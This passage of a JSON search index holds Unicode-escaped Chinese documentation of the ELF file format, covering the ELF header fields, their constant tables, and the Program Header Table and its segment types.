\u5934\u90e8\u8868\u4ee5\u5916\uff0c\u5176\u5b83\u90e8\u5206\u90fd\u6ca1\u6709\u4e25\u683c\u7684\u7684\u987a\u5e8f\u3002", 
            "title": "\u6587\u4ef6\u683c\u5f0f"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_3", 
            "text": "ELF \u6587\u4ef6\u683c\u5f0f\u652f\u6301 8 \u4f4d/32 \u4f4d\u4f53\u7cfb\u7ed3\u6784\u3002\u5f53\u7136\uff0c\u8fd9\u79cd\u683c\u5f0f\u662f\u53ef\u4ee5\u6269\u5c55\u7684\uff0c\u4e5f\u53ef\u4ee5\u652f\u6301\u66f4\u5c0f\u7684\u6216\u8005\u66f4\u5927\u4f4d\u6570\u7684\u5904\u7406\u5668\u67b6\u6784\u3002\u56e0\u6b64\uff0c\u76ee\u6807\u6587\u4ef6\u4f1a\u5305\u542b\u4e00\u4e9b\u63a7\u5236\u6570\u636e\uff0c\u8fd9\u90e8\u5206\u6570\u636e\u8868\u660e\u4e86\u76ee\u6807\u6587\u4ef6\u6240\u4f7f\u7528\u7684\u67b6\u6784\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u5b83\u53ef\u4ee5\u88ab\u901a\u7528\u7684\u65b9\u5f0f\u6765\u8bc6\u522b\u548c\u89e3\u91ca\u3002\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u5176\u5b83\u6570\u636e\u91c7\u7528\u76ee\u7684\u5904\u7406\u5668\u7684\u683c\u5f0f\u8fdb\u884c\u7f16\u7801\uff0c\u4e0e\u5728\u4f55\u79cd\u673a\u5668\u4e0a\u521b\u5efa\u6ca1\u6709\u5173\u7cfb\u3002\u8fd9\u91cc\u5176\u5b9e\u60f3\u8868\u660e\u7684\u610f\u601d\u76ee\u6807\u6587\u4ef6\u53ef\u4ee5\u8fdb\u884c\u4ea4\u53c9\u7f16\u8bd1\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 x86 \u5e73\u53f0\u751f\u6210 arm \u5e73\u53f0\u7684\u53ef\u6267\u884c\u4ee3\u7801\u3002  \u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u6570\u636e\u7ed3\u6784\u90fd\u9075\u4ece\u201c\u81ea\u7136\u201d\u5927\u5c0f\u548c\u5bf9\u9f50\u89c4\u5219\u3002\u5982\u4e0b     \u540d\u79f0  \u957f\u5ea6  \u5bf9\u9f50\u65b9\u5f0f  \u7528\u9014      Elf32_Addr  4  4  \u65e0\u7b26\u53f7\u7a0b\u5e8f\u5730\u5740    Elf32_Half  2  2  \u65e0\u7b26\u53f7\u534a\u6574\u578b    Elf32_Off  4  4  \u65e0\u7b26\u53f7\u6587\u4ef6\u504f\u79fb    Elf32_Sword  4  4  \u6709\u7b26\u53f7\u5927\u6574\u578b    Elf32_Word  4  4  \u65e0\u7b26\u53f7\u5927\u6574\u578b    unsigned char  1  1  \u65e0\u7b26\u53f7\u5c0f\u6574\u578b     \u5982\u679c\u5fc5\u8981\uff0c\u6570\u636e\u7ed3\u6784\u53ef\u4ee5\u5305\u542b\u663e\u5f0f\u5730\u8865\u9f50\u6765\u786e\u4fdd 4 \u5b57\u8282\u5bf9\u8c61\u6309 4 \u5b57\u8282\u5bf9\u9f50\uff0c\u5f3a\u5236\u6570\u636e\u7ed3\u6784\u7684\u5927\u5c0f\u662f 4 \u7684\u6574\u6570\u500d\u7b49\u7b49\u3002\u6570\u636e\u540c\u6837\u9002\u7528\u662f\u5bf9\u9f50\u7684\u3002\u56e0\u6b64\uff0c\u5305\u542b\u4e00\u4e2a Elf32_Addr \u7c7b\u578b\u6210\u5458\u7684\u7ed3\u6784\u4f53\u4f1a\u5728\u6587\u4ef6\u4e2d\u7684 4 \u5b57\u8282\u8fb9\u754c\u5904\u5bf9\u9f50\u3002  \u4e3a\u4e86\u5177\u6709\u53ef\u79fb\u690d\u6027\uff0cELF \u6587\u4ef6\u4e0d\u4f7f\u7528\u4f4d\u57df\u3002", 
            "title": "\u6570\u636e\u5f62\u5f0f"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_4", 
            "text": "\u5f85\u3002  \u6ce8\uff1a\u5728\u4e0b\u9762\u7684\u4ecb\u7ecd\u4e2d\uff0c\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\u3002", 
            "title": "\u5b57\u7b26\u8868\u793a"
        }, 
        {
            "location": "/executable/elf/elf_structure/#elf-header", 
            "text": "ELF Header \u63cf\u8ff0\u4e86 ELF \u6587\u4ef6\u7684\u6982\u8981\u4fe1\u606f\uff0c\u5229\u7528\u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u53ef\u4ee5\u7d22\u5f15\u5230 ELF \u6587\u4ef6\u7684\u5168\u90e8\u4fe1\u606f\uff0c\u6570\u636e\u7ed3\u6784\u5982\u4e0b\uff1a  #define EI_NIDENT   16  typedef   struct   { \n     unsigned   char     e_ident [ EI_NIDENT ]; \n     ELF32_Half        e_type ; \n     ELF32_Half        e_machine ; \n     ELF32_Word        e_version ; \n     ELF32_Addr        e_entry ; \n     ELF32_Off         e_phoff ; \n     ELF32_Off         e_shoff ; \n     ELF32_Word        e_flags ; \n     ELF32_Half        e_ehsize ; \n     ELF32_Half        e_phentsize ; \n     ELF32_Half        e_phnum ; \n     ELF32_Half        e_shentsize ; \n     ELF32_Half        e_shnum ; \n     ELF32_Half        e_shstrndx ;  }   Elf32_Ehdr ;   \u5176\u4e2d\u6bcf\u4e2a\u6210\u5458\u90fd\u662f e \u5f00\u5934\u7684\uff0c\u5b83\u4eec\u5e94\u8be5\u90fd\u662f ELF \u7684\u7f29\u5199\u3002\u6bcf\u4e2a\u6210\u5458\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b\u3002", 
            "title": "ELF Header"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_ident", 
            "text": "\u6b63\u5982\u4e4b\u524d\u6240\u8bf4\uff0cELF \u63d0\u4f9b\u4e86\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u6846\u67b6\uff0c\u4ee5\u4fbf\u4e8e\u652f\u6301\u591a\u79cd\u5904\u7406\u5668\uff0c\u591a\u79cd\u7f16\u7801\u683c\u5f0f\u7684\u673a\u5668\u3002\u8be5\u53d8\u91cf\u7ed9\u51fa\u4e86\u7528\u4e8e\u89e3\u7801\u548c\u89e3\u91ca\u6587\u4ef6\u4e2d\u4e0e\u673a\u5668\u65e0\u5173\u7684\u6570\u636e\u7684\u65b9\u5f0f\u3002\u8fd9\u4e2a\u6570\u7ec4\u5bf9\u4e8e\u4e0d\u540c\u7684\u4e0b\u6807\u7684\u542b\u4e49\u5982\u4e0b     \u5b8f\u540d\u79f0  \u4e0b\u6807  \u76ee\u7684      EI_MAG0  0  \u6587\u4ef6\u6807\u8bc6    EI_MAG1  1  \u6587\u4ef6\u6807\u8bc6    EI_MAG2  2  \u6587\u4ef6\u6807\u8bc6    EI_MAG3  3  \u6587\u4ef6\u6807\u8bc6    EI_CLASS  4  \u6587\u4ef6\u7c7b    EI_DATA  5  \u6570\u636e\u7f16\u7801    EI_VERSION  6  \u6587\u4ef6\u7248\u672c    EI_PAD  7  \u8865\u9f50\u5b57\u8282\u5f00\u59cb\u5904     \u5176\u4e2d\uff0c  e_ident[EI_MAG0]   \u5230  e_ident[EI_MAG3] \uff0c\u5373\u6587\u4ef6\u7684\u59344\u4e2a\u5b57\u8282\uff0c\u88ab\u79f0\u4f5c\u201c\u9b54\u6570\u201d\uff0c\u6807\u8bc6\u8be5\u6587\u4ef6\u662f\u4e00\u4e2aELF\u76ee\u6807\u6587\u4ef6\u3002 \u81f3\u4e8e\u5f00\u5934\u4e3a\u4ec0\u4e48\u662f0x7f\uff0c\u5e76\u6ca1\u6709\u4ed4\u7ec6\u53bb\u67e5\u8fc7 \u3002     \u540d\u79f0  \u503c  \u4f4d\u7f6e      ELFMAG0  0x7f  e_ident[EI_MAG0]    ELFMAG1  \u2018E\u2019  e_ident[EI_MAG1]    ELFMAG2  \u2018L\u2019  e_ident[EI_MAG2]    ELFMAG3  \u2018F\u2019  e_ident[EI_MAG3]     e_ident[EI_CLASS]  \u4e3a  e_ident[EI_MAG3] \u7684\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u6807\u8bc6\u6587\u4ef6\u7684\u7c7b\u578b\u6216\u5bb9\u91cf\u3002     \u540d\u79f0  \u503c  \u610f\u4e49      ELFCLASSNONE  0  \u65e0\u6548\u7c7b\u578b    ELFCLASS32  1  32\u4f4d\u6587\u4ef6    ELFCLASS64  2  64\u4f4d\u6587\u4ef6     ELF \u6587\u4ef6\u7684\u8bbe\u8ba1\u4f7f\u5f97\u5b83\u53ef\u4ee5\u5728\u591a\u79cd\u5b57\u8282\u957f\u5ea6\u7684\u673a\u5668\u4e4b\u95f4\u79fb\u690d\uff0c\u800c\u4e0d\u9700\u8981\u5f3a\u5236\u89c4\u5b9a\u673a\u5668\u7684\u6700\u957f\u5b57\u8282\u957f\u5ea6\u548c\u6700\u77ed\u5b57\u8282\u957f\u5ea6\u3002 ELFCLASS32 \u7c7b\u578b\u652f\u6301\u6587\u4ef6\u5927\u5c0f\u548c\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e0a\u9650\u4e3a 4GB \u7684\u673a\u5668\uff1b\u5b83\u4f7f\u7528\u4e0a\u8ff0\u5b9a\u4e49\u4e2d\u7684\u57fa\u672c\u7c7b\u578b\u3002  ELFCLASS64  \u7c7b\u578b\u7528\u4e8e 64 \u4f4d\u67b6\u6784\u3002  e_ident[EI_DATA] \u5b57\u8282\u7ed9\u51fa\u4e86\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u7279\u5b9a\u5904\u7406\u5668\u6570\u636e\u7684\u7f16\u7801\u65b9\u5f0f\u3002\u4e0b\u9762\u662f\u76ee\u524d\u5df2\u5b9a\u4e49\u7684\u7f16\u7801\uff1a     \u540d\u79f0  \u503c  \u610f\u4e49      ELFDATANONE  0  \u65e0\u6548\u6570\u636e\u7f16\u7801    ELFDATA2LSB  1  \u5c0f\u7aef    ELFDATA2MSB  2  \u5927\u7aef     \u5176\u5b83\u503c\u88ab\u4fdd\u7559\uff0c\u5728\u672a\u6765\u5fc5\u8981\u65f6\u5c06\u88ab\u8d4b\u4e88\u65b0\u7684\u7f16\u7801\u3002  \u6587\u4ef6\u6570\u636e\u7f16\u7801\u65b9\u5f0f\u8868\u660e\u4e86\u6587\u4ef6\u5185\u5bb9\u7684\u89e3\u6790\u65b9\u5f0f\u3002\u6b63\u5982\u4e4b\u524d\u6240\u8ff0\uff0c ELFCLASS32 \u7c7b\u578b\u6587\u4ef6\u4f7f\u7528\u4e86\u5177\u67091\uff0c2 \u548c 4 \u5b57\u8282\u7684\u53d8\u91cf\u7c7b\u578b\u3002\u5bf9\u4e8e\u5df2\u5b9a\u4e49\u7684\u4e0d\u540c\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u5176\u8868\u793a\u5982\u4e0b\u6240\u793a\uff0c\u5176\u4e2d\u5b57\u8282\u53f7\u5728\u5de6\u4e0a\u89d2\u3002  ELFDATA2LSB \u7f16\u7801\u4f7f\u7528\u8865\u7801\uff0c\u6700\u4f4e\u6709\u6548\u4f4d\uff08Least Significant Byte\uff09\u5360\u7528\u6700\u4f4e\u5730\u5740\u3002   ELFDATA2MSB \u7f16\u7801\u4f7f\u7528\u8865\u7801\uff0c\u6700\u9ad8\u6709\u6548\u4f4d\uff08Most Significant Byte\uff09\u5360\u7528\u6700\u4f4e\u5730\u5740\u3002   e_ident[EI_DATA]  \u7ed9\u51fa\u4e86 ELF \u5934\u7684\u7248\u672c\u53f7\u3002\u76ee\u524d\u8fd9\u4e2a\u503c\u5fc5\u987b\u662f EV_CURRENT \uff0c\u5373\u4e4b\u524d\u5df2\u7ecf\u7ed9\u51fa\u7684 e_version \u3002  e_ident[EI_PAD]  \u7ed9\u51fa\u4e86  e_ident  \u4e2d\u672a\u4f7f\u7528\u5b57\u8282\u7684\u5f00\u59cb\u5730\u5740\u3002\u8fd9\u4e9b\u5b57\u8282\u88ab\u4fdd\u7559\u5e76\u7f6e\u4e3a0\uff1b\u5904\u7406\u76ee\u6807\u6587\u4ef6\u7684\u7a0b\u5e8f\u5e94\u8be5\u5ffd\u7565\u5b83\u4eec\u3002\u5982\u679c\u4e4b\u540e\u8fd9\u4e9b\u5b57\u8282\u88ab\u4f7f\u7528\uff0cEI_PAD\u7684\u503c\u5c31\u4f1a\u6539\u53d8\u3002", 
            "title": "e_ident"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_type", 
            "text": "e_type  \u6807\u8bc6\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u3002     \u540d\u79f0  \u503c  \u610f\u4e49      ET_NONE  0  \u65e0\u6587\u4ef6\u7c7b\u578b    ET_REL  1  \u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6    ET_EXEC  2  \u53ef\u6267\u884c\u6587\u4ef6    ET_DYN  3  \u5171\u4eab\u76ee\u6807\u6587\u4ef6    ET_CORE  4  \u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6    ET_LOPROC  0xff00  \u5904\u7406\u5668\u6307\u5b9a\u4e0b\u9650    ET_HIPROC  0xffff  \u5904\u7406\u5668\u6307\u5b9a\u4e0a\u9650     \u867d\u7136\u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6\u7684\u5185\u5bb9\u6ca1\u6709\u88ab\u8be6\u7ec6\u8bf4\u660e\uff0c\u4f46  ET_CORE  \u8fd8\u662f\u88ab\u4fdd\u7559\u7528\u4e8e\u6807\u5fd7\u6b64\u7c7b\u6587\u4ef6\u3002\u4ece  ET_LOPROC  \u5230  ET_HIPROC  (\u5305\u62ec\u8fb9\u754c)\u88ab\u4fdd\u7559\u7528\u4e8e\u5904\u7406\u5668\u6307\u5b9a\u7684\u573a\u666f\u3002\u5176\u5b83\u503c\u5728\u672a\u6765\u5fc5\u8981\u65f6\u53ef\u88ab\u8d4b\u4e88\u65b0\u7684\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u3002", 
            "title": "e_type"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_machine", 
            "text": "\u8fd9\u4e00\u9879\u6307\u5b9a\u4e86\u5f53\u524d\u6587\u4ef6\u53ef\u4ee5\u8fd0\u884c\u7684\u673a\u5668\u67b6\u6784\u3002     \u540d\u79f0  \u503c  \u610f\u4e49      EM_NONE  0  \u65e0\u673a\u5668\u7c7b\u578b    EM_M32  1  AT T WE 32100    EM_SPARC  2  SPARC    EM_386  3  Intel 80386    EM_68K  4  Motorola 68000    EM_88K  5  Motorola 88000    EM_860  7  Intel 80860    EM_MIPS  8  MIPS RS3000     \u5176\u4e2d EM \u5e94\u8be5\u662f  ELF Machine  \u7684\u7b80\u5199\u3002  \u5176\u5b83\u503c\u88ab\u5728\u672a\u6765\u5fc5\u8981\u65f6\u7528\u4e8e\u65b0\u7684\u673a\u5668\u3002 \u6b64\u5916\uff0c\u7279\u5b9a\u5904\u7406\u5668\u7684ELF\u540d\u79f0\u4f7f\u7528\u673a\u5668\u540d\u79f0\u6765\u8fdb\u884c\u533a\u5206\uff0c\u4e00\u822c\u6807\u5fd7\u4f1a\u6709\u4e2a\u524d\u7f00 EF_  \uff08ELF Flag\uff09\u3002\u4f8b\u5982\uff0c\u5728 EM_XYZ \u673a\u5668\u4e0a\u540d\u53eb  WIDGET  \u7684\u6807\u5fd7\u5c06\u88ab\u79f0\u4e3a  EF_XYZ_WIDGET \u3002", 
            "title": "e_machine"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_version", 
            "text": "\u6807\u8bc6\u76ee\u6807\u6587\u4ef6\u7684\u7248\u672c\u3002     \u540d\u79f0  \u503c  \u610f\u4e49      EV_NONE  0  \u65e0\u6548\u7248\u672c    EV_CURRENT  1  \u5f53\u524d\u7248\u672c     1 \u8868\u793a\u521d\u59cb\u6587\u4ef6\u683c\u5f0f\uff1b\u672a\u6765\u6269\u5c55\u65b0\u7684\u7248\u672c\u7684\u65f6\u5019(extensions)\u5c06\u4f7f\u7528\u66f4\u5927\u7684\u6570\u5b57\u3002\u867d\u7136\u5728\u4e0a\u9762\u503c EV_CURRENT \u4e3a1\uff0c\u4f46\u662f\u4e3a\u4e86\u53cd\u6620\u5f53\u524d\u7248\u672c\u53f7\uff0c\u5b83\u53ef\u80fd\u4f1a\u6539\u53d8\uff0c \u6bd4\u5982ELF\u5230\u73b0\u5728\u4e5f\u5c31\u662f1.2\u7248\u672c\u3002", 
            "title": "e_version"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_entry", 
            "text": "\u8fd9\u4e00\u9879\u4e3a\u7cfb\u7edf\u8f6c\u4ea4\u63a7\u5236\u6743\u7ed9 ELF \u4e2d\u76f8\u5e94\u4ee3\u7801\u7684\u865a\u62df\u5730\u5740\u3002\u5982\u679c\u6ca1\u6709\u76f8\u5173\u7684\u5165\u53e3\u9879\uff0c\u5219\u8fd9\u4e00\u9879\u4e3a0\u3002", 
            "title": "e_entry"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_phoff", 
            "text": "\u8fd9\u4e00\u9879\u7ed9\u51fa \u7a0b\u5e8f\u5934\u90e8\u8868 \u5728\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u504f\u79fb\uff08 Program Header table OFFset \uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u5219\u4e3a0\u3002", 
            "title": "e_phoff"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_shoff", 
            "text": "\u8fd9\u4e00\u9879\u7ed9\u51fa \u8282\u5934\u8868 \u5728\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u504f\u79fb\uff08  Section Header table OFFset  \uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u5934\u8868\uff0c\u5219\u4e3a0\u3002", 
            "title": "e_shoff"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_flags", 
            "text": "\u8fd9\u4e00\u9879\u7ed9\u51fa\u6587\u4ef6\u4e2d\u4e0e\u7279\u5b9a\u5904\u7406\u5668\u76f8\u5173\u7684\u6807\u5fd7\uff0c\u8fd9\u4e9b\u6807\u5fd7\u547d\u540d\u683c\u5f0f\u4e3a EF_machine_flag \u3002", 
            "title": "e_flags"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_ehsize", 
            "text": "\u8fd9\u4e00\u9879\u7ed9\u51fa ELF \u6587\u4ef6\u5934\u90e8\u7684\u5b57\u8282\u957f\u5ea6\uff08ELF Header Size\uff09\u3002", 
            "title": "e_ehsize"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_phentsize", 
            "text": "\u8fd9\u4e00\u9879\u7ed9\u51fa\u7a0b\u5e8f\u5934\u90e8\u8868\u4e2d\u6bcf\u4e2a\u8868\u9879\u7684\u5b57\u8282\u957f\u5ea6\uff08 Program Header ENTry SIZE \uff09\u3002\u6bcf\u4e2a\u8868\u9879\u7684\u5927\u5c0f\u76f8\u540c\u3002", 
            "title": "e_phentsize"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_phnum", 
            "text": "\u8fd9\u4e00\u9879\u7ed9\u51fa\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u9879\u6570\uff08  Program Header entry NUMber  \uff09\u3002\u56e0\u6b64\uff0c e_phnum  \u4e0e  e_phentsize  \u7684\u4e58\u79ef\u5373\u4e3a\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u5b57\u8282\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a0\u3002", 
            "title": "e_phnum"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_shentsize", 
            "text": "\u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u7684\u5b57\u8282\u957f\u5ea6\uff08 Section Header ENTry SIZE \uff09\u3002\u4e00\u4e2a\u8282\u5934\u662f\u8282\u5934\u8868\u4e2d\u7684\u4e00\u9879\uff1b\u8282\u5934\u8868\u4e2d\u6240\u6709\u9879\u5360\u636e\u7684\u7a7a\u95f4\u5927\u5c0f\u76f8\u540c\u3002", 
            "title": "e_shentsize"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_shnum", 
            "text": "\u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u8868\u4e2d\u7684\u9879\u6570\uff08 Section Header NUMber \uff09\u3002\u56e0\u6b64\uff0c  e_shnum  \u4e0e  e_shentsize  \u7684\u4e58\u79ef\u5373\u4e3a\u8282\u5934\u8868\u7684\u5b57\u8282\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u5934\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a0\u3002", 
            "title": "e_shnum"
        }, 
        {
            "location": "/executable/elf/elf_structure/#e_shstrndx", 
            "text": "\u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u8868\u4e2d\u4e0e\u8282\u540d\u5b57\u7b26\u4e32\u8868\u76f8\u5173\u7684\u8868\u9879\u7684\u7d22\u5f15\u503c\uff08 Section Header table InDeX related with section  name STRing table \uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u540d\u5b57\u7b26\u4e32\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a SHN_UNDEF \u3002\u5173\u4e8e\u7ec6\u8282\u7684\u4ecb\u7ecd\uff0c\u8bf7\u53c2\u8003\u540e\u9762\u7684\u201c\u8282\u201d\u548c\u201c\u5b57\u7b26\u4e32\u8868\u201d\u90e8\u5206\u3002", 
            "title": "e_shstrndx"
        }, 
        {
            "location": "/executable/elf/elf_structure/#program-header-table", 
            "text": "", 
            "title": "Program Header Table"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_5", 
            "text": "Program Header Table \u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u6bcf\u4e00\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u662f  Elf32_Phdr \uff0c\u63cf\u8ff0\u4e86\u4e00\u4e2a\u6bb5\u6216\u8005\u5176\u5b83\u7cfb\u7edf\u5728\u51c6\u5907\u7a0b\u5e8f\u6267\u884c\u65f6\u6240\u9700\u8981\u7684\u4fe1\u606f\u3002\u5176\u4e2d\uff0cELF \u5934\u4e2d\u7684  e_phentsize  \u548c  e_phnum  \u6307\u5b9a\u4e86\u8be5\u6570\u7ec4\u6bcf\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\u4ee5\u53ca\u5143\u7d20\u4e2a\u6570\u3002\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u7684\u6bb5\u5305\u542b\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u8282\u3002 \u7a0b\u5e8f\u7684\u5934\u90e8\u53ea\u6709\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6709\u610f\u4e49\u3002  \u53ef\u4ee5\u8bf4\uff0cProgram Header Table \u5c31\u662f\u4e13\u95e8\u4e3a ELF \u6587\u4ef6\u8fd0\u884c\u65f6\u4e2d\u7684\u6bb5\u6240\u51c6\u5907\u7684\u3002  Elf32_Phdr  \u7684\u6570\u636e\u7ed3\u6784\u5982\u4e0b  typedef   struct   { \n     ELF32_Word    p_type ; \n     ELF32_Off     p_offset ; \n     ELF32_Addr    p_vaddr ; \n     ELF32_Addr    p_paddr ; \n     ELF32_Word    p_filesz ; \n     ELF32_Word    p_memsz ; \n     ELF32_Word    p_flags ; \n     ELF32_Word    p_align ;  }   Elf32_Phdr ;   \u6bcf\u4e2a\u5b57\u6bb5\u7684\u8bf4\u660e\u5982\u4e0b     \u5b57\u6bb5  \u8bf4\u660e      p_type  \u8be5\u5b57\u6bb5\u4e3a\u6bb5\u7684\u7c7b\u578b\uff0c\u6216\u8005\u8868\u660e\u4e86\u8be5\u7ed3\u6784\u7684\u76f8\u5173\u4fe1\u606f\u3002    p_offset  \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u4ece\u6587\u4ef6\u5f00\u59cb\u5230\u8be5\u6bb5\u5f00\u5934\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u3002    p_vaddr  \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u8be5\u6bb5\u7b2c\u4e00\u4e2a\u5b57\u8282\u5728\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u3002    p_paddr  \u8be5\u5b57\u6bb5\u4ec5\u7528\u4e8e\u7269\u7406\u5730\u5740\u5bfb\u5740\u76f8\u5173\u7684\u7cfb\u7edf\u4e2d\uff0c \u7531\u4e8e\u201dSystem V\u201d\u5ffd\u7565\u4e86\u5e94\u7528\u7a0b\u5e8f\u7684\u7269\u7406\u5bfb\u5740\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u8be5\u9879\u5185\u5bb9\u5e76\u672a\u88ab\u9650\u5b9a\u3002    p_filesz  \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u6587\u4ef6\u955c\u50cf\u4e2d\u8be5\u6bb5\u7684\u5927\u5c0f\uff0c\u53ef\u80fd\u4e3a0\u3002    p_memsz  \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u5185\u5b58\u955c\u50cf\u4e2d\u8be5\u6bb5\u7684\u5927\u5c0f\uff0c\u53ef\u80fd\u4e3a0\u3002    p_flags  \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u4e0e\u6bb5\u76f8\u5173\u7684\u6807\u8bb0\u3002    p_align  \u53ef\u52a0\u8f7d\u7684\u7a0b\u5e8f\u7684\u6bb5\u7684 p_vaddr \u4ee5\u53ca p_offset \u7684\u5927\u5c0f\u5fc5\u987b\u662f page \u7684\u6574\u6570\u500d\u3002\u8be5\u6210\u5458\u7ed9\u51fa\u4e86\u6bb5\u5728\u6587\u4ef6\u4ee5\u53ca\u5185\u5b58\u4e2d\u7684\u5bf9\u9f50\u65b9\u5f0f\u3002\u5982\u679c\u8be5\u503c\u4e3a 0 \u6216 1 \u7684\u8bdd\uff0c\u8868\u793a\u4e0d\u9700\u8981\u5bf9\u9f50\u3002\u9664\u6b64\u4e4b\u5916\uff0cp_align \u5e94\u8be5\u662f 2 \u7684\u6574\u6570\u6307\u6570\u6b21\u65b9\uff0c\u5e76\u4e14 p_vaddr \u4e0e p_offset \u5728\u6a21 p_align \u7684\u610f\u4e49\u4e0b\uff0c\u5e94\u8be5\u76f8\u7b49\u3002", 
            "title": "\u6982\u8ff0"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_6", 
            "text": "\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u7684\u6bb5\u7c7b\u578b\u5982\u4e0b     \u540d\u5b57  \u53d6\u503c  \u8bf4\u660e      PT_NULL  0  \u8868\u660e\u6bb5\u672a\u4f7f\u7528\uff0c\u5176\u7ed3\u6784\u4e2d\u5176\u4ed6\u6210\u5458\u90fd\u662f\u672a\u5b9a\u4e49\u7684\u3002    PT_LOAD  1  \u6b64\u7c7b\u578b\u6bb5\u4e3a\u4e00\u4e2a\u53ef\u52a0\u8f7d\u7684\u6bb5\uff0c\u5927\u5c0f\u7531 p_filesz \u548c p_memsz  \u63cf\u8ff0\u3002\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u88ab\u6620\u5c04\u5230\u76f8\u5e94\u5185\u5b58\u6bb5\u5f00\u59cb\u5904\u3002\u5982\u679c p_memsz  \u5927\u4e8e  p_filesz\uff0c\u201c\u5269\u4f59\u201d\u7684\u5b57\u8282\u90fd\u8981\u88ab\u7f6e\u4e3a0\u3002p_filesz \u4e0d\u80fd\u5927\u4e8e p_memsz\u3002\u53ef\u52a0\u8f7d\u7684\u6bb5\u5728\u7a0b\u5e8f\u5934\u90e8\u4e2d\u6309\u7167 p_vaddr \u7684\u5347\u5e8f\u6392\u5217\u3002    PT_DYNAMIC  2  \u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u52a8\u6001\u94fe\u63a5\u4fe1\u606f\u3002    PT_INTERP  3  \u6b64\u7c7b\u578b\u6bb5\u7ed9\u51fa\u4e86\u4e00\u4e2a\u4ee5 NULL  \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\u548c\u957f\u5ea6\uff0c\u8be5\u5b57\u7b26\u4e32\u5c06\u88ab\u5f53\u4f5c\u89e3\u91ca\u5668\u8c03\u7528\u3002\u8fd9\u79cd\u6bb5\u7c7b\u578b\u4ec5\u5bf9\u53ef\u6267\u884c\u6587\u4ef6\u6709\u610f\u4e49\uff08\u4e5f\u53ef\u80fd\u51fa\u73b0\u5728\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\uff09\u3002\u6b64\u5916\uff0c\u8fd9\u79cd\u6bb5\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d\u6700\u591a\u51fa\u73b0\u4e00\u6b21\u3002\u800c\u4e14\u8fd9\u79cd\u7c7b\u578b\u7684\u6bb5\u5b58\u5728\u7684\u8bdd\uff0c\u5b83\u5fc5\u987b\u5728\u6240\u6709\u53ef\u52a0\u8f7d\u6bb5\u9879\u7684\u524d\u9762\u3002    PT_NOTE  4  